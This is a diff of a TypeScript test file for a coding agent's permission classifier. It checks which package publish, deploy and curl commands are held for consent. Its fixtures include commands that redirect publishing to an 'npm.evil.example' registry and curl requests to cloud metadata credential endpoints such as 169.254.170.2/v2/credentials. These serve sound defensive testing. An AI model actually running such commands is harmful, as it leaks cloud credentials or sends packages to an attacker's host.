@@ -15,6 +15,7 @@ import { TomlReader } from "../../src/permission/toml-reader"
 import type { InstanceContext } from "../../src/project/instance-context"
 import { Risk } from "../../src/tool/risk"
 import { readSteps } from "../../src/tool/shell"
+import { ADMIN_RIGHTS, ARCHIVE_FIRST, CREDENTIAL_CHANGE, DELETE_COMPOUND, IRREVERSIBLE_ARCHIVE, OUTSIDE_WRITE, answerOf } from "./consented-literals"
 import { tmpdir } from "../fixture/fixture"
 
 type Input = AutonomyTable.Input
@@ -66,14 +67,21 @@ const subagent = (given: Input) => AutonomyTable.classify({ ...given, bypass: { 
 const short = (verdict: Verdict) => [verdict.class, verdict.category, verdict.destination]
 const label = (given: Input) => String(given.metadata.command)
 
+/** 1.1.3 (T9 G8): a literal consented verdict per case: class, category, `bypassed`, destination, and the agent's answer. */
+type Want = { verdict: [string, string, string | undefined, string | undefined]; answer: string | undefined }
+const RUNS = (bypassed: string, destination?: string): Want => ({ verdict: ["A", "by_main_agent", bypassed, destination], answer: undefined })
+const REFUSED = (category: string, bypassed: string | undefined, answer: string): Want => ({ verdict: ["X", category, bypassed, undefined], answer })
+function expectWant(label: string, verdict: Verdict, want: Want) {
+  expect([label, verdict.class, verdict.category, verdict.bypassed, verdict.destination, answerOf(verdict)]).toEqual([label, ...want.verdict, want.answer])
+}
+
 function expectOpens(given: Input, destination: string) {
   expect([label(given), base(given).class === "A"]).toEqual([label(given), false])
   for (const verdict of [root(given), subagent(given)])
     expect([label(given), short(verdict)]).toEqual([label(given), ["A", "by_main_agent", destination]])
 }
-function expectNotOpen(given: Input) {
-  for (const verdict of [root(given), subagent(given)])
-    expect([label(given), verdict.class === "A", verdict.destination]).toEqual([label(given), false, undefined])
+function expectNotOpen(given: Input, want: Want) {
+  for (const verdict of [root(given), subagent(given)]) expectWant(label(given), verdict, want)
 }
 const named = (...hosts: string[]): AutonomyTable.Outward => ({ allowed: [], named: hosts.map((host) => ({ kind: "host", host })) })
 
@@ -143,10 +151,10 @@ describe("P48: TOML is read without the Bun global", () => {
     const crate = await project({ "Cargo.toml": '[package]\nname = "x"\nversion = "0.1.0"\n' })
     expectOpens(await sh("cargo publish", crate), "crates.io")
     write(crate, ".cargo/config.toml", "[registry\ndefault = 'x'\n")
-    expectNotOpen(await sh("cargo publish", crate))
+    expectNotOpen(await sh("cargo publish", crate), RUNS("outward"))
     // 1.1.1 F36 (P52): a cargo config file holds by being there, whatever it says.
     write(crate, ".cargo/config.toml", "# no registry here\n[net]\nretry = 2\n")
-    expectNotOpen(await sh("cargo publish", crate))
+    expectNotOpen(await sh("cargo publish", crate), RUNS("outward"))
     fs.rmSync(path.join(crate, ".cargo/config.toml"))
     expectOpens(await sh("cargo publish", crate), "crates.io")
   })
@@ -156,10 +164,10 @@ describe("CR13-1 / P49 3: a publish names no folder, tarball or package", () => 
   test("a folder's own publish hook is never run unread", async () => {
     const here = await npmProject({}, { "hk/package.json": JSON.stringify({ name: "hk", version: "1.0.0", scripts: { prepublishOnly: "node x.js" } }) })
     for (const command of ["npm publish ./hk", "npm publish hk/", "npm publish x.tgz", "npm publish .", "npm publish p@1.0.0", "pnpm publish hk", "bun publish ./hk", "yarn npm publish hk"])
-      expectNotOpen(await sh(command, here))
+      expectNotOpen(await sh(command, here), RUNS("outward"))
     // Run in the folder: it is not the project's top, so it holds too.
-    expectNotOpen(await sh("npm publish", here, undefined, path.join(here, "hk")))
-    expectNotOpen(await sh("cd hk && npm publish", here))
+    expectNotOpen(await sh("npm publish", here, undefined, path.join(here, "hk")), RUNS("outward"))
+    expectNotOpen(await sh("cd hk && npm publish", here), RUNS("outward"))
     expectOpens(await sh("npm publish", here), "registry.npmjs.org")
   })
 })
@@ -189,7 +197,7 @@ describe("G13-1 / CR13-2: npm-family options and configuration", () => {
       "bun publish --cwd sub",
       "yarn npm publish --registry https://npm.evil.example/",
     ])
-      expectNotOpen(await sh(command, dir))
+      expectNotOpen(await sh(command, dir), RUNS("outward"))
     expectOpens(await sh("npm publish --access public --tag next", dir), "registry.npmjs.org")
     expectOpens(await sh("npm publish --dry-run --provenance --otp=123456", dir), "registry.npmjs.org")
     expectOpens(await sh("pnpm publish --no-git-checks --access public", dir), "registry.npmjs.org")
@@ -200,36 +208,36 @@ describe("G13-1 / CR13-2: npm-family options and configuration", () => {
     const here = await npmProject()
     expectOpens(await sh("npm publish", here), "registry.npmjs.org")
     atHome(".npmrc", "registry=https://npm.evil.example/\n")
-    expectNotOpen(await sh("npm publish", here))
+    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
     // 1.1.1 F39 (V15-1, P54): a user npmrc of only allowlisted lines (a default-registry token, a neutral key) opens.
     atHome(".npmrc", "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\nsave-exact=true\n")
     expectOpens(await sh("npm publish", here), "registry.npmjs.org")
     atHome(".npmrc", "@acme:registry=https://npm.evil.example/\n")
-    expectNotOpen(await sh("npm publish", here))
+    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
     atHome(".npmrc", "[section]\nx=1\n")
-    expectNotOpen(await sh("npm publish", here))
+    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
     fs.rmSync(path.join(home(), ".npmrc"))
     // A user config elsewhere, named by the environment npm gives its scripts.
     write(here, "elsewhere/u.npmrc", "registry=https://npm.evil.example/\n")
     setEnv("npm_config_userconfig", path.join(here, "elsewhere/u.npmrc"))
-    expectNotOpen(await sh("npm publish", here))
+    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
     delete process.env.npm_config_userconfig
     // A global config by its prefix in the user's file.
     write(here, "prefix/etc/npmrc", "registry=https://npm.evil.example/\n")
     atHome(".npmrc", `prefix=${path.join(here, "prefix")}\n`)
-    expectNotOpen(await sh("npm publish", here))
+    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
     fs.rmSync(path.join(home(), ".npmrc"))
     setEnv("npm_config_registry", "https://npm.evil.example/")
-    expectNotOpen(await sh("npm publish", here))
+    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
     delete process.env.npm_config_registry
     setEnv("NPM_CONFIG_@ACME:REGISTRY", "https://npm.evil.example/")
-    expectNotOpen(await sh("npm publish", here))
+    expectNotOpen(await sh("npm publish", here), RUNS("outward"))
     delete process.env["NPM_CONFIG_@ACME:REGISTRY"]
     atHome(".yarnrc.yml", "npmScopes:\n  acme:\n    npmRegistryServer: https://npm.evil.example/\n")
-    expectNotOpen(await sh("yarn npm publish", here))
+    expectNotOpen(await sh("yarn npm publish", here), RUNS("outward"))
     fs.rmSync(path.join(home(), ".yarnrc.yml"))
     atHome(".bunfig.toml", '[install.scopes]\nacme = "https://npm.evil.example/"\n')
-    expectNotOpen(await sh("bun publish", here))
+    expectNotOpen(await sh("bun publish", here), RUNS("outward"))
     fs.rmSync(path.join(home(), ".bunfig.toml"))
     expectOpens(await sh("npm publish", here), "registry.npmjs.org")
   })
@@ -237,12 +245,12 @@ describe("G13-1 / CR13-2: npm-family options and configuration", () => {
   test("publishConfig with any key holds (1.1.1 F36, P52)", async () => {
     expectOpens(await sh("npm publish", await npmProject({ publishConfig: {} })), "registry.npmjs.org")
     for (const config of [{ access: "public", tag: "next", provenance: true }, { registry: "https://registry.npmjs.org/" }, { "@acme:registry": "x" }, { directory: "dist" }, { userconfig: "x" }, "x"])
-      expectNotOpen(await sh("npm publish", await npmProject({ publishConfig: config })))
+      expectNotOpen(await sh("npm publish", await npmProject({ publishConfig: config })), RUNS("outward"))
   })
 
   test("a registry the person named does not open a publish any more", async () => {
-    expectNotOpen(await sh("npm publish --registry https://npm.named.com/", dir, named("npm.named.com")))
-    expectNotOpen(await sh("npm publish", await npmProject({}, { ".npmrc": "registry=https://npm.named.com/\n" }), named("npm.named.com")))
+    expectNotOpen(await sh("npm publish --registry https://npm.named.com/", dir, named("npm.named.com")), RUNS("outward"))
+    expectNotOpen(await sh("npm publish", await npmProject({}, { ".npmrc": "registry=https://npm.named.com/\n" }), named("npm.named.com")), RUNS("outward"))
   })
 })
 
@@ -252,20 +260,20 @@ describe("G13-2 / CR13-2: cargo options, configuration and manifest", () => {
 
   test("options that move the registry, the config or the package hold", async () => {
     const here = await crate()
-    for (const command of [
-      "cargo publish --config registry.default=evil",
-      "cargo publish --config ./evil.toml",
-      "cargo publish --manifest-path other/Cargo.toml",
-      "cargo publish -p other",
-      "cargo publish --package other",
-      "cargo publish --registry crates-io",
-      "cargo publish --index sparse+https://x.test/",
-      "cargo publish -Z unstable-options",
-      "cargo publish --workspace",
-      "cargo +nightly publish",
-      "cargo publish --token abc",
-    ])
-      expectNotOpen(await sh(command, here))
+    for (const [command, want] of [
+      ["cargo publish --config registry.default=evil", RUNS("outward")],
+      ["cargo publish --config ./evil.toml", RUNS("outward")],
+      ["cargo publish --manifest-path other/Cargo.toml", RUNS("outward")],
+      ["cargo publish -p other", RUNS("outward")],
+      ["cargo publish --package other", RUNS("outward")],
+      ["cargo publish --registry crates-io", RUNS("outward")],
+      ["cargo publish --index sparse+https://x.test/", RUNS("outward")],
+      ["cargo publish -Z unstable-options", RUNS("outward")],
+      ["cargo publish --workspace", RUNS("outward")],
+      ["cargo +nightly publish", RUNS("not_routine")],
+      ["cargo publish --token abc", RUNS("outward")],
+    ] as [string, Want][])
+      expectNotOpen(await sh(command, here), want)
     expectOpens(await sh("cargo publish --dry-run", here), "crates.io")
     expectOpens(await sh("cargo publish --allow-dirty --no-verify --locked", here), "crates.io")
   })
@@ -283,28 +291,28 @@ describe("G13-2 / CR13-2: cargo options, configuration and manifest", () => {
       'package = { name = "x" }\n',
       '[package\nname = "x"\n',
     ])
-      expectNotOpen(await sh("cargo publish", await crate(manifest)))
+      expectNotOpen(await sh("cargo publish", await crate(manifest)), RUNS("outward"))
     // No manifest in the top folder, or run below it.
-    expectNotOpen(await sh("cargo publish", dir))
+    expectNotOpen(await sh("cargo publish", dir), RUNS("outward"))
     const nested = await crate(undefined, { "sub/Cargo.toml": '[package]\nname = "y"\n' })
-    expectNotOpen(await sh("cd sub && cargo publish", nested))
+    expectNotOpen(await sh("cd sub && cargo publish", nested), RUNS("outward"))
   })
 
   test("cargo config from the folder up and in CARGO_HOME, and the environment", async () => {
     const here = await crate()
     for (const config of ['[registry]\ndefault = "corp"\n', 'registry.default = "corp"\n', '[source.crates-io]\nreplace-with = "mirror"\n', '[registries.corp]\nindex = "x"\n', 'include = "other.toml"\n'])
-      expectNotOpen(await sh("cargo publish", await crate(undefined, { ".cargo/config.toml": config })))
+      expectNotOpen(await sh("cargo publish", await crate(undefined, { ".cargo/config.toml": config })), RUNS("outward"))
     // 1.1.1 F36 (P52): a config file with credentials only holds as well.
-    expectNotOpen(await sh("cargo publish", await crate(undefined, { ".cargo/config.toml": '[registry]\nglobal-credential-providers = ["cargo:token"]\n' })))
+    expectNotOpen(await sh("cargo publish", await crate(undefined, { ".cargo/config.toml": '[registry]\nglobal-credential-providers = ["cargo:token"]\n' })), RUNS("outward"))
     atHome(".cargo/config.toml", '[registry]\ndefault = "corp"\n')
-    expectNotOpen(await sh("cargo publish", here))
+    expectNotOpen(await sh("cargo publish", here), RUNS("outward"))
     fs.rmSync(path.join(home(), ".cargo/config.toml"))
     setEnv("CARGO_REGISTRY_DEFAULT", "corp")
-    expectNotOpen(await sh("cargo publish", here))
+    expectNotOpen(await sh("cargo publish", here), RUNS("outward"))
     delete process.env.CARGO_REGISTRY_DEFAULT
     // 1.1.1 F36 (P52): every CARGO_REGISTR* variable holds; 1.1.1 F39 (V15-3, P54) but the crates.io token.
     setEnv("CARGO_REGISTRY_CREDENTIAL_PROVIDER", "x")
-    expectNotOpen(await sh("cargo publish", here))
+    expectNotOpen(await sh("cargo publish", here), RUNS("outward"))
     delete process.env.CARGO_REGISTRY_CREDENTIAL_PROVIDER
     setEnv("CARGO_REGISTRY_TOKEN", "x")
     expectOpens(await sh("cargo publish", here), "crates.io")
@@ -320,8 +328,8 @@ describe("P49 3: poetry, uv and twine forms", () => {
     expectOpens(await sh("poetry publish --build", here), "pypi.org")
     expectOpens(await sh("uv publish --dry-run", here), "pypi.org")
     for (const command of ["poetry publish -r test", "poetry publish --repository test", "poetry publish --repo test", "poetry publish --dist-dir out", "uv publish --publish-url https://x.test/", "uv publish --index corp", "uv publish dist/x.whl", "uv publish --check-url https://x.test/"])
-      expectNotOpen(await sh(command, here))
-    expectNotOpen(await sh("poetry publish", dir))
+      expectNotOpen(await sh(command, here), RUNS("outward"))
+    expectNotOpen(await sh("poetry publish", dir), RUNS("outward"))
   })
 
   test("a registry setting in pyproject, uv.toml or poetry's config holds", async () => {
@@ -331,12 +339,12 @@ describe("P49 3: poetry, uv and twine forms", () => {
       ["poetry", '[tool.poetry]\nname = "x"\n[[tool.poetry.source]]\nname = "corp"\nurl = "https://x.test/"\n'],
       ["uv", '[project]\nname = "x"\n[tool.uv\nindex-url = "https://x.test/"\n'],
     ] as const)
-      expectNotOpen(await sh(`${tool} publish`, await python(pyproject)))
-    expectNotOpen(await sh("uv publish", await python(undefined, { "uv.toml": 'publish-url = "https://x.test/"\n' })))
-    expectNotOpen(await sh("poetry publish", await python(undefined, { "poetry.toml": '[repositories.corp]\nurl = "https://x.test/"\n' })))
+      expectNotOpen(await sh(`${tool} publish`, await python(pyproject)), RUNS("outward"))
+    expectNotOpen(await sh("uv publish", await python(undefined, { "uv.toml": 'publish-url = "https://x.test/"\n' })), RUNS("outward"))
+    expectNotOpen(await sh("poetry publish", await python(undefined, { "poetry.toml": '[repositories.corp]\nurl = "https://x.test/"\n' })), RUNS("outward"))
     const here = await python()
     setEnv("UV_PUBLISH_URL", "https://x.test/")
-    expectNotOpen(await sh("uv publish", here))
+    expectNotOpen(await sh("uv publish", here), RUNS("outward"))
     delete process.env.UV_PUBLISH_URL
     expectOpens(await sh("uv publish", here), "pypi.org")
   })
@@ -354,12 +362,12 @@ describe("P49 3: poetry, uv and twine forms", () => {
       "twine upload dist/../../x.whl",
       "twine upload",
     ])
-      expectNotOpen(await sh(command, here))
+      expectNotOpen(await sh(command, here), RUNS("outward"))
     atHome(".pypirc", "[pypi]\nrepository = https://x.test/\n")
-    expectNotOpen(await sh("twine upload dist/x.whl", here))
+    expectNotOpen(await sh("twine upload dist/x.whl", here), RUNS("outward"))
     fs.rmSync(path.join(home(), ".pypirc"))
     setEnv("TWINE_REPOSITORY", "pypi")
-    expectNotOpen(await sh("twine upload dist/x.whl", here))
+    expectNotOpen(await sh("twine upload dist/x.whl", here), RUNS("outward"))
   })
 })
 
@@ -378,7 +386,7 @@ describe("CR13-4 / G13-5: netlify opens only with --no-build, a --dir inside, an
       "netlify deploy --no-build --dir dist --dir other",
       "netlify deploy --no-build --dir dist extra",
     ])
-      expectNotOpen(await sh(command, here))
+      expectNotOpen(await sh(command, here), RUNS("outward"))
   })
 
   test("base and contexts move the folders; functions folders must land inside", async () => {
@@ -393,9 +401,9 @@ describe("CR13-4 / G13-5: netlify opens only with --no-build, a --dir inside, an
       'build = { publish = "dist" }\n',
       '[build\npublish = "dist"\n',
     ])
-      expectNotOpen(await sh(command, await project({ "netlify.toml": toml })))
+      expectNotOpen(await sh(command, await project({ "netlify.toml": toml })), RUNS("outward"))
     // 1.1.1 F36 (P52, CR14-2): only a [build] table with a plain publish opens.
-    expectNotOpen(await sh(command, await project({ "netlify.toml": '[build]\npublish = "dist"\ncommand = "make"\n[functions]\ndirectory = "fn"\n' })))
+    expectNotOpen(await sh(command, await project({ "netlify.toml": '[build]\npublish = "dist"\ncommand = "make"\n[functions]\ndirectory = "fn"\n' })), RUNS("outward"))
     expectOpens(await sh(command, await project({ "netlify.toml": '[build]\npublish = "dist"\n' })), "netlify")
   })
 })
@@ -406,7 +414,7 @@ describe("G13-4 / G13-8 / P49 3: firebase opens only for hosting", () => {
     expectOpens(await sh("firebase deploy --only hosting", here), "firebase")
     expectOpens(await sh("firebase deploy --only hosting:site-a,hosting:site-b --project demo", here), "firebase demo")
     for (const command of ["firebase deploy", "firebase deploy --only functions", "firebase deploy --only hosting,functions", "firebase deploy --except functions", "firebase deploy --only hosting --only functions", "firebase deploy --only hosting extra"])
-      expectNotOpen(await sh(command, here))
+      expectNotOpen(await sh(command, here), RUNS("outward"))
   })
 
   test("functions, remote config and framework sources hold; hosting rewrites do not", async () => {
@@ -416,7 +424,7 @@ describe("G13-4 / G13-8 / P49 3: firebase opens only for hosting", () => {
       { hosting: { source: "." } },
       { hosting: [{ target: "a", public: "dist" }, { target: "b", source: "app", frameworksBackend: { region: "x" } }] },
     ])
-      expectNotOpen(await sh("firebase deploy --only hosting", await project({ "firebase.json": JSON.stringify(config) })))
+      expectNotOpen(await sh("firebase deploy --only hosting", await project({ "firebase.json": JSON.stringify(config) })), RUNS("outward"))
     const rewrites = { hosting: { public: "dist", rewrites: [{ source: "/api/**", function: "api" }] } }
     expectOpens(await sh("firebase deploy --only hosting", await project({ "firebase.json": JSON.stringify(rewrites) })), "firebase")
   })
@@ -424,17 +432,17 @@ describe("G13-4 / G13-8 / P49 3: firebase opens only for hosting", () => {
 
 describe("CR13-3 / P49 1: cloud metadata endpoints are not local", () => {
   test("every link-local IPv4 address, fd00:ec2::/32 and the metadata short names", async () => {
-    for (const command of [
-      "curl -s -H 'Metadata-Flavor: Google' http://metadata/computeMetadata/v1/",
-      "curl -s http://169.254.170.2/v2/credentials/x",
-      "curl -s http://169.254.170.23/v1/credentials",
-      "curl -s 'http://[fd00:ec2::23]/'",
-      "curl -s http://instance-data/latest/meta-data/",
-      "curl -s http://METADATA./x",
-      "curl -s http://169.254.1.1/",
-      "curl -s 'http://[::ffff:169.254.170.2]/'",
-    ])
-      expectNotOpen(await sh(command, dir))
+    for (const [command, want] of [
+      ["curl -s -H 'Metadata-Flavor: Google' http://metadata/computeMetadata/v1/", RUNS("outward", "metadata")],
+      ["curl -s http://169.254.170.2/v2/credentials/x", RUNS("outward", "169.254.170.2")],
+      ["curl -s http://169.254.170.23/v1/credentials", RUNS("outward", "169.254.170.23")],
+      ["curl -s 'http://[fd00:ec2::23]/'", RUNS("outward", "fd00:ec2::23")],
+      ["curl -s http://instance-data/latest/meta-data/", RUNS("outward", "instance-data")],
+      ["curl -s http://METADATA./x", RUNS("outward", "metadata")],
+      ["curl -s http://169.254.1.1/", RUNS("outward", "169.254.1.1")],
+      ["curl -s 'http://[::ffff:169.254.170.2]/'", RUNS("outward", "::ffff:a9fe:aa02")],
+    ] as [string, Want][])
+      expectNotOpen(await sh(command, dir), want)
     for (const host of ["metadata", "instance-data", "169.254.0.1", "169.254.255.255", "fd00:ec2::1", "fd00:ec2:ffff::1"])
       expect([host, OutwardConsent.localHost(host)]).toEqual([host, false])
     expectOpens(await sh("curl -s http://db:5432/", dir), "db:5432")
@@ -446,7 +454,7 @@ describe("CR13-3 / P49 1: cloud metadata endpoints are not local", () => {
 describe("CR13-5 / G13-3: an httpie or xh item value does not start with an expansion", () => {
   test("held at the start, open after a literal character", async () => {
     for (const command of ['http localhost:3000/x "Authorization:$TOKEN"', 'http localhost:3000/x "f=$DATA"', 'xh POST localhost:3000/x "j:=$DATA"', 'http localhost:3000/x "q==$Q"'])
-      expectNotOpen(await sh(command, dir))
+      expectNotOpen(await sh(command, dir), RUNS("outward", "localhost:3000"))
     expectOpens(await sh('http localhost:3000/x "Authorization:Bearer $TOKEN"', dir), "localhost:3000")
     expectOpens(await sh('http localhost:3000/x "f=v$DATA"', dir), "localhost:3000")
   })
